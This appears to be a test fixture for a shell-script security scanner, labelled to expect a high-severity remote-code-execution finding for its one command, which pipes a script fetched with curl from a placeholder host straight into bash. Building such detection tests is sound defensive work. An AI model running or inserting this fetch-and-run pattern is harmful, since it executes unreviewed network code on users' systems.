#!/usr/bin/env bash
# expect-level: HIGH
# expect-rule: remote_code_execution
bash <(curl -s https://example.com/i.sh)
